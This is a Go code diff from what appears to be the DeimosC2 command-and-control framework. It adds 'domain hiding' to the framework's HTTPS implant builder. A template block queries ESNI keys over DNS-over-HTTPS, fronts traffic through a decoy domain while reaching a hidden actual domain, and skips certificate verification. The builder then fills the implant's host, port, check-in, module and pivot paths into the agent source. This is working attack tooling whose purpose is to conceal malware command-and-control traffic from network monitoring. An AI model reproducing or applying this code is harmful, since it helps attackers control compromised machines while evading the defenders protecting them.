@@ -32,6 +32,42 @@ type obfLocations struct {
 	doh   string
 }
 
+//Code for compiling HTTPS agents depending on Domain Hiding or not
+var (
+	//Code from https://github.com/SixGenInc/Noctilucent/blob/master/DeimosC2/HTTPS_agent.go
+	hiddenCodeMain string = `	
+	esniKeysBytes, _ := domainhiding.QueryESNIKeysForHostDoH("cloudflare.com", true)
+	esnikeys, _ := tls.ParseESNIKeys(esniKeysBytes)
+
+	tlsConfig := &tls.Config{
+		InsecureSkipVerify: true,
+		ClientESNIKeys:     esnikeys,
+		MinVersion:         tls.VersionTLS13, // Force TLS 1.3
+		MaxVersion:         tls.VersionTLS13,
+		ESNIServerName:     actualDomain,
+		PreserveSNI:        true,
+		ServerName:         frontDomain}
+
+	pubKey = []byte(stringPubKey)
+	var (
+		conn *tls.Conn
+	)
+
+	var err error
+	httpClient = &http.Client{
+		Transport: &http.Transport{
+			DialTLS: func(network, addr string) (net.Conn, error) {
+				conn, err = tls.Dial("tcp", host+":"+port, tlsConfig)
+				return conn, err
+			},
+		},
+	}`
+
+	nonHiddenCodeMain string = `
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	pubKey = []byte(stringPubKey)`
+)
+
 //Init will build agents on the inital startup of a listener
 //Note we will overwrite old binaries
 func Init(lType string, lName string, pubKey []byte, host string, port string, delay string, jitter string, eol string, livehours string, advanced interface{}, gooses []string, arches []string, obf bool) {
@@ -75,12 +111,14 @@ func Init(lType string, lName string, pubKey []byte, host string, port string, d
 		logging.ErrorLogger.Println(err.Error())
 	}
 
-	output := strings.Replace(string(input), "{{HOST}}", strings.TrimSpace(host), -1)
-	output = strings.Replace(string(output), "{{PORT}}", strings.TrimSpace(port), -1)
-	output = strings.Replace(string(output), "{{DELAY}}", strings.TrimSpace(delay), -1)
+	output := strings.Replace(string(input), "{{DELAY}}", strings.TrimSpace(delay), -1)
 	output = strings.Replace(string(output), "{{JITTER}}", strings.TrimSpace(jitter), -1)
 	output = strings.Replace(string(output), "{{EOL}}", strings.TrimSpace(eol), -1)
 	output = strings.Replace(string(output), "{{LIVEHOURS}}", strings.TrimSpace(livehours), -1)
+	if lType != "HTTPS" {
+		output = strings.Replace(string(output), "{{HOST}}", strings.TrimSpace(host), -1)
+		output = strings.Replace(string(output), "{{PORT}}", strings.TrimSpace(port), -1)
+	}
 	if lType != "DoH" {
 		output = strings.Replace(string(output), "{{PUBKEY}}", string(pubKey), -1)
 	} else {
@@ -90,13 +128,46 @@ func Init(lType string, lName string, pubKey []byte, host string, port string, d
 
 	if lType == "HTTPS" || lType == "QUIC" {
 		m := advanced.(map[string]interface{})
-		if !validation.ValidateMap(m, []string{"registerPath", "checkinPath", "modulePath", "pivotPath"}) {
-			return
+		if lType == "HTTPS" {
+			if !validation.ValidateMap(m, []string{"domainHiding", "frontDomainIP", "frontDomainPort", "frontDomain", "actualDomain", "registerPath", "checkinPath", "modulePath", "pivotPath"}) {
+				return
+			}
+			//Options for Domain Hiding
+			if m["domainHiding"].(bool) {
+				logging.Logger.Println("Domain Hiding is set to: ", m["domainHiding"].(bool))
+				output = strings.Replace(string(output), "{{HOST}}", strings.TrimSpace(m["frontDomainIP"].(string)), -1)
+				output = strings.Replace(string(output), "{{PORT}}", strings.TrimSpace(m["frontDomainPort"].(string)), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_CRYPT}}", strings.TrimSpace("\"github.com/SixGenInc/Noctilucent/tls\""), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_CODE_BLOCK_MAIN}}", strings.TrimSpace(hiddenCodeMain), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_HOST}}", strings.TrimSpace("actualDomain"), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_FRONTDOMAIN}}", strings.TrimSpace("var frontDomain = \""+m["frontDomain"].(string)+"\""), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_ACTDOMAIN}}", strings.TrimSpace("var actualDomain = \""+m["actualDomain"].(string)+"\""), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_ESNI_IMPORT}}", strings.TrimSpace("\"github.com/DeimosC2/DeimosC2/agents/resources/domainhiding\""), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_HTTPCLIENT}}", strings.TrimSpace("var httpClient *http.Client"), -1)
+			} else {
+				output = strings.Replace(string(output), "{{HOST}}", strings.TrimSpace(host), -1)
+				output = strings.Replace(string(output), "{{PORT}}", strings.TrimSpace(port), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_CRYPT}}", strings.TrimSpace("\"crypto/tls\""), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_CODE_BLOCK_MAIN}}", strings.TrimSpace(nonHiddenCodeMain), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_HOST}}", strings.TrimSpace("host"), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_FRONTDOMAIN}}", strings.TrimSpace(""), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_ACTDOMAIN}}", strings.TrimSpace(""), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_ESNI_IMPORT}}", strings.TrimSpace(""), -1)
+				output = strings.Replace(string(output), "{{HIDDEN_HTTPCLIENT}}", strings.TrimSpace(""), -1)
+			}
+			output = strings.Replace(string(output), "{{FIRSTTIME}}", strings.TrimSpace(m["registerPath"].(string)), -1)
+			output = strings.Replace(string(output), "{{CHECKIN}}", strings.TrimSpace(m["checkinPath"].(string)), -1)
+			output = strings.Replace(string(output), "{{MODULELOC}}", strings.TrimSpace(m["modulePath"].(string)), -1)
+			output = strings.Replace(string(output), "{{PIVOTLOC}}", strings.TrimSpace(m["pivotPath"].(string)), -1)
+		} else {
+			if !validation.ValidateMap(m, []string{"registerPath", "checkinPath", "modulePath", "pivotPath"}) {
+				return
+			}
+			output = strings.Replace(string(output), "{{FIRSTTIME}}", strings.TrimSpace(m["registerPath"].(string)), -1)
+			output = strings.Replace(string(output), "{{CHECKIN}}", strings.TrimSpace(m["checkinPath"].(string)), -1)
+			output = strings.Replace(string(output), "{{MODULELOC}}", strings.TrimSpace(m["modulePath"].(string)), -1)
+			output = strings.Replace(string(output), "{{PIVOTLOC}}", strings.TrimSpace(m["pivotPath"].(string)), -1)
 		}
-		output = strings.Replace(string(output), "{{FIRSTTIME}}", strings.TrimSpace(m["registerPath"].(string)), -1)
-		output = strings.Replace(string(output), "{{CHECKIN}}", strings.TrimSpace(m["checkinPath"].(string)), -1)
-		output = strings.Replace(string(output), "{{MODULELOC}}", strings.TrimSpace(m["modulePath"].(string)), -1)
-		output = strings.Replace(string(output), "{{PIVOTLOC}}", strings.TrimSpace(m["pivotPath"].(string)), -1)
 	} else if lType == "DoH" {
 		m := advanced.(map[string]interface{})
 		if !validation.ValidateMap(m, []string{"firsttime", "checkin", "successResponse", "failureResponse", "jobExists"}) {
